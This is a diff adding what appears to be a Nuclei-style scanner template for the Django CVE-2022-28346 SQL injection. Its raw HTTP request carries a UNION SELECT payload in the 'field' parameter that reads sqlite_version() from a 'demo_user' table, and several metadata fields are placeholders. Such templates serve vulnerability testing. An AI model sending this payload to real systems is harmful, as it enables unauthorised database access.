@@ -1,0 +1,31 @@
+id: django-demo-sqli
+info:
+  name: Django-CVE-2022-28346-SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: CVE-2022-28346
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: django,sqli
+
+http:
+  - raw:
+      - |
+        GET /demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" -- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'users:','Admin')
+        condition: and
